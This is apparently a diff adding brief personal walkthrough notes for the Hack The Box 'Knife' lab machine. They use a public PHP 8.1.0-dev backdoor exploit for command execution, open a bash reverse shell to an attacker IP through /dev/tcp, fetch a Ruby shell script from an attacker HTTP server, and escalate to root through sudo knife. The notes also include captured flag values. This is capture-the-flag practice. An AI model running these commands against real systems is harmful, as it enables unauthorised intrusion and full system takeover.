@@ -1,0 +1,41 @@
+
+
+http://10.10.10.242
+F12 --> Network --> Headers is PHP/8.1.0-dev
+
+google search php/8.1.0-dev exploit
+https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html
+
+save with .py
+wget https://packetstormsecurity.com/files/download/162749/php_8.1.0-dev.py.txt -O exploit.py
+
+python3 exploit.py -u http://10.10.10.242/ -c "id"
+
+on other tab
+nc -lnvp 4445
+python3 exploit.py -u http://10.10.10.242/ -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.14/4445 0>&1'"
+
+
+cat user.txt
+f3e50c4bfb6d1a7c518d1833867f97a0
+
+on my machine
+vi shell.rb
+exec "/bin/bash -i"
+python3 -m http.server
+
+on target machine
+cd /tmp
+wget http://10.10.14.14/shell.rb
+sudo knife user list -c shell.rb
+id
+cat /root/root.txt
+7b7d817ea25e07a6abcec5566efde889
+
+
+OR
+sudo knife exec --exec "exec '/bin/sh -i' " 
+id
+
+https://app.hackthebox.eu/machines/Knife
+https://nepcodex.com/2021/06/knife-walkthrough-hackthebox-writeup/
